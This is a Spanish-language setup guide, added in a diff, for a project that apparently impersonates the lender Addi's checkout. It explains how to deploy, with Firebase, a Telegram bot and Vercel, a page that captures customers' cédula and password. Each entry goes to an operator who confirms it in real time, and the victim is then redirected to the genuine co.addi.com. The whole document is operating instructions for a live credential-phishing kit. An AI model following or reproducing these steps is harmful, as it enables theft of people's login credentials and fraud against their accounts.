@@ -1,0 +1,185 @@
+=========================================================
+ GUÍA DE CONFIGURACIÓN — BOT DE TELEGRAM + FIREBASE + VERCEL
+ Proyecto: Addi Checkout (validación por bot de Telegram)
+=========================================================
+
+Este proyecto NO usa dashboard: el asesor aprueba todo desde
+un bot de Telegram. El flujo del cliente es:
+
+  1) Usuario (cédula)
+  2) Contraseña
+  3) Pantalla de carga «Verificación exitosa» (la activas tú
+     desde Telegram)
+  4) Asesor virtual + redirección a https://co.addi.com
+
+Tienes que hacer 4 partes (en este orden):
+  PARTE 1 → Firebase (base de datos)
+  PARTE 2 → Bot de Telegram
+  PARTE 3 → Vercel (deploy + variables)
+  PARTE 4 → Conectar el webhook
+
+
+=========================================================
+ PARTE 1 — FIREBASE (BASE DE DATOS)
+=========================================================
+
+1.1) Crea el proyecto
+  - Entra a: https://console.firebase.google.com
+  - Botón «Añadir proyecto» → ponle un nombre (ej: addi-prod)
+  - Pulsa «Crear proyecto»
+
+1.2) Activa Firestore (es la base de datos)
+  - Menú izquierdo: Build → Firestore Database
+  - Pulsa «Crear base de datos» → botón Siguiente →
+    modo «Producción» → Crear
+
+1.3) Activa el login ANÓNIMO (obligatorio)
+  - Menú: Build → Authentication → Empezar
+  - Pestaña «Sign-in method» → busca «Anónimo» →
+    actívalo → Guardar
+
+1.4) Pega las reglas de seguridad
+  - En Firestore, abre la pestaña «Rules»
+  - Borra lo que haya y pega TODO el contenido del archivo
+    firestore.rules.json de este proyecto
+  - Cambia el token 'CAMBIA-ESTE-TOKEN' por uno tuyo:
+        adminToken == 'mi-clave-secreta'
+  - Pulsa «Publicar»
+
+1.5) Copia los datos de tu proyecto
+  - Engranaje (arriba a la izquierda) → Configuración del
+    proyecto → pestaña «Tus apps» → icono de la app web
+  - Anota estos 6 valores: apiKey, authDomain, projectId,
+    storageBucket, messagingSenderId, appId
+
+1.6) Cambia los datos en el archivo index.html
+  - Busca el bloque «FIREBASE_CONFIG» y reemplaza los 6
+    valores por los de TU proyecto
+  - Busca «ADMIN_TOKEN» y pon el MISMO token que usaste en
+    las reglas (ej: 'mi-clave-secreta')
+
+  IMPORTANTE: el token debe ser IGUAL en 3 sitios:
+    - firestore.rules.json  (paso 1.4)
+    - index.html → ADMIN_TOKEN
+    - Vercel → FIREBASE_ADMIN_TOKEN  (paso 3)
+
+
+=========================================================
+ PARTE 2 — BOT DE TELEGRAM
+=========================================================
+
+2.1) Crea tu bot con BotFather
+  - En Telegram busca: @BotFather
+  - Envía: /newbot
+  - Ponle un nombre (ej: Addi Asesor) y un usuario
+    (ej: addi_asesor_bot)
+  - BotFather te entregará un TOKEN:
+        Ejemplo: 123456789:AAHxYzABCDefgh...
+    Ese token es el TELEGRAM_BOT_TOKEN (secreto)
+
+2.2) Consigue tu chat id (el del asesor)
+  - Abre tu bot, pulsa «Iniciar» y escribe cualquier mensaje
+    (ej: hola)
+  - En el navegador abre:
+        https://api.telegram.org/bot<TU_TOKEN>/getUpdates
+    (ej: https://api.telegram.org/bot123456789:AAHx.../getUpdates)
+  - Busca en el texto:  "chat":{"id": 987654321, ...
+    El número (987654321) es tu ADMIN_CHAT_ID
+
+=========================================================
+ PARTE 3 — VERCEL (DEPLOY + VARIABLES)
+=========================================================
+
+3.1) Sube el proyecto
+  Opción A) Con GitHub:
+    - Sube esta carpeta a un repositorio
+    - Entra a https://vercel.com → Add New → Project →
+      importa el repo → Deploy
+
+  Opción B) Con la terminal (CLI):
+    - Desde la carpeta del proyecto ejecuta:
+          npm i -g vercel
+          vercel login
+          vercel --prod
+
+3.2) Define las variables de entorno
+  - En Vercel: tu proyecto → Settings → Environment Variables
+  - Añade estas 5 (marca también Development/Preview si quieres
+    probar en previews):
+
+    TELEGRAM_BOT_TOKEN   = <token de BotFather>
+    ADMIN_CHAT_ID        = <tu número de chat>  (solo números)
+    FIREBASE_API_KEY     = <apiKey de tu Firebase>
+    FIREBASE_PROJECT_ID  = <projectId de tu Firebase>
+    FIREBASE_ADMIN_TOKEN = <el mismo token del paso 1.6>
+
+  - Redespliega (Deployments → Redeploy) después de guardar
+    las variables o los cambios no tomarán efecto.
+
+
+=========================================================
+ PARTE 4 — CONECTAR EL WEBHOOK (ÚLTIMO PASO)
+=========================================================
+
+El bot necesita saber a qué página llamar cuando tocas un
+botón. Se hace UNA sola vez después del deploy:
+
+  Abre en el navegador:
+
+  https://api.telegram.org/bot<TU_TOKEN>/setWebhook?url=https://TU-DOMINIO.vercel.app/api/bot
+
+  Ejemplo real:
+  https://api.telegram.org/bot123456789:AAHx.../setWebhook?url=https://addi-prod.vercel.app/api/bot
+
+  ✓ Si responde:  {"ok":true}  → ya quedó conectado.
+  ✗ Si responde {"ok":false} → revisa que el token sea correcto
+    o ejecuta el mismo enlace sin la parte &url (primero borra
+    el webhook anterior).
+
+
+=========================================================
+ PARTE 5 — PRUEBA RÁPIDA
+=========================================================
+
+ 1. Abre el bot en Telegram → /menu → «🧪 Probar bot».
+    Debes recibir ✅.
+ 2. Abre tu URL (https://TU-DOMINIO.vercel.app) y escribe la
+    cédula → Continuar.
+ 3. En Telegram te llega: «✓ Cuenta existe / ✗ Cuenta no
+    existe». Toca ✓.
+ 4. Escribe la contraseña → Continuar.
+ 5. Te llega: «✓ Verificación exitosa / ✗ Contraseña
+    incorrecta». Toca ✓.
+ 6. El cliente ve «Verificación exitosa» (carga) y luego la
+    pantalla del asesor virtual; al final se redirige a
+    https://co.addi.com
+
+
+=========================================================
+ SI NO FUNCIONA (revisa en este orden)
+=========================================================
+
+ 1) El bot no responde nada
+    - El webhook está conectado (getWebhookInfo)?
+        https://api.telegram.org/bot<TU_TOKEN>/getWebhookInfo
+    - Las variables TELEGRAM_BOT_TOKEN y ADMIN_CHAT_ID existen
+      en Vercel y se redesplegó.
+
+ 2) Los botones llegan pero «no hacen nada»
+    - FIREBASE_API_KEY / FIREBASE_PROJECT_ID están usando la
+      base equivocada (mira que sean de TU proyecto).
+    - El token FIREBASE_ADMIN_TOKEN NO es igual que el de
+      firestore.rules.json e index.html.
+    - La autenticación anónima está desactivada.
+
+ 3) El cliente dice «Tu sesión fue cerrada»
+    - Se creó el documento en la colección «solicitudes»?
+      Revisa Firestore. El cliente borra/cerrado el doc no
+      debe existir antes de que el cliente se conecte.
+    - Espera a que pase: el cliente crea el doc al cargar.
+
+ 4) Mensajes duplicados
+    - Normal: cada cambio de espera genera un aviso; son 2-3
+      mensajes por cliente (cédula, contraseña, listo).
+
+--- FIN DE LA GUÍA ---
